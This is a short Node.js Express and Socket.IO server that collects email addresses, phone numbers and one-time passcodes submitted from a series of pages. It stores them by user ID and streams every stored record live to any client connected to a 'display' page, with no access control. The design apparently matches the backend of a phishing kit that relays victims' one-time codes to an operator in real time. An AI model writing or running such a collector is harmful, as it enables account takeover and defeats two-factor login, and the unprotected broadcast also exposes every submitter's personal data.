const express = require('express');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const port = process.env.PORT || 3000;

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());

// Sample in-memory data storage (in real apps, consider using a database)
let userData = {};

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/email', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'email.html'));
});

app.get('/phone', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'phone.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'OTP.html'));
});

app.get('/display', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'display.html'));
});

// API Endpoints to receive data
app.post('/submit-email', (req, res) => {
    const { userId, email } = req.body;
    userData[userId] = { ...userData[userId], email };
    io.emit('dataUpdated', Object.values(userData));
    res.json({ status: 'Email received' });
});

app.post('/submit-phone', (req, res) => {
    const { userId, phone } = req.body;
    userData[userId] = { ...userData[userId], phone };
    io.emit('dataUpdated', Object.values(userData));
    res.json({ status: 'Phone number received' });
});

app.post('/submit-otp', (req, res) => {
    const { userId, otp } = req.body;
    userData[userId] = { ...userData[userId], otp };
    io.emit('dataUpdated', Object.values(userData));
    res.json({ status: 'OTP received' });
});

// Socket.IO connection
io.on('connection', (socket) => {
    console.log('A user connected');
    socket.emit('dataUpdated', Object.values(userData));

    socket.on('disconnect', () => {
        console.log('A user disconnected');
    });
});

// Start server
server.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
